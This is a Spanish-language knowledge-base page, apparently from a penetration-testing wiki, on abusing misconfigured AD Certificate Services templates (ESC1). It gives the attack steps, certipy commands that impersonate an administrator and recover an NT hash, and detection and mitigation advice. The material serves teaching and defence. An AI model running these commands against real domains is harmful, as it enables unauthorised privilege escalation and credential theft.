---
title: Abuso de ADCS (AD Certificate Services)
resumen: Usar plantillas de certificados mal configuradas para autenticarse como cualquier usuario, incluido Domain Admin.
tags: certipy
---

## Definición

AD Certificate Services (ADCS) es el rol de Windows Server que implementa una PKI (*Public Key Infrastructure*) integrada con AD, usada para emitir certificados digitales a usuarios, equipos y servicios (autenticación, firma de código, EFS, smart cards...). El componente clave a nivel ofensivo son las **Certificate Templates**: plantillas que definen qué campos, permisos y usos (EKU, *Enhanced Key Usage*) puede tener un certificado emitido a partir de ellas. Una plantilla mal configurada que permita **Client Authentication** y que sea inscribible por usuarios de bajo privilegio puede usarse para obtener un certificado que autentica como cualquier otro usuario del dominio (vía PKINIT/Kerberos) — literalmente equivalente a robar su contraseña o hash.

## Cuándo se usa

Cuando el dominio tiene ADCS desplegado (muy habitual en entornos corporativos) y se sospecha o confirma una plantilla vulnerable (los escenarios clásicos catalogados como ESC1-ESC8 cubren desde plantillas que permiten especificar un SAN arbitrario, hasta abusos sobre el propio servidor CA).

## Requisitos previos

- Usuario válido del dominio con permisos de inscripción (`Enroll`) sobre alguna plantilla vulnerable.
- Conectividad con el servidor CA (normalmente vía RPC/web enrollment).

## Desarrollo del ataque

1. Enumerar las plantillas de certificados publicadas y sus permisos de inscripción y EKU.
2. Identificar plantillas vulnerables (por ejemplo, que permitan que el propio solicitante especifique el *Subject Alternative Name*, `ESC1`).
3. Solicitar un certificado suplantando a un usuario objetivo (típicamente uno privilegiado) aprovechando la mala configuración.
4. Usar el certificado obtenido para autenticarse por Kerberos (PKINIT) como ese usuario, recuperando su hash NT en el proceso.

```bash
# Enumerar plantillas vulnerables del dominio
certipy find -u 'usuario@dominio.local' -p 'contraseña' -dc-ip IP_DC -vulnerable

# Explotar una plantilla ESC1 (SAN arbitrario) suplantando a un usuario privilegiado
certipy req -u 'usuario@dominio.local' -p 'contraseña' -ca 'NombreCA' -template 'PlantillaVulnerable' -upn 'administrator@dominio.local'

# Autenticarse con el certificado obtenido y recuperar el hash NT del usuario suplantado
certipy auth -pfx administrator.pfx -dc-ip IP_DC
```

## Herramientas relacionadas

- Ver [[certipy]]

## Detección y mitigación

Auditar todas las plantillas publicadas y restringir la inscripción a los grupos estrictamente necesarios, deshabilitar `ENROLLEE_SUPPLIES_SUBJECT` en plantillas que no lo necesiten, exigir aprobación manual o autenticación fuerte para plantillas sensibles, y monitorizar la emisión de certificados con EKU de autenticación de cliente hacia cuentas privilegiadas.
